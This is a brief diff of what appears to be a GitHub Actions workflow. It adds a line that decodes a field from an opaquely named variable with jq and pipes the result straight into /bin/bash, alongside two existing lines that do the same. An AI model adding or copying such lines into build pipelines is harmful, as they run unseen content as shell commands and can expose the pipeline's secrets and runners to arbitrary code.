@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$x41" | jq -r .kizm28541 | /bin/bash
           echo $c2 | jq -r .cwjxa82342 | /bin/bash
+          echo $xg8 | jq -r .dti45918 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
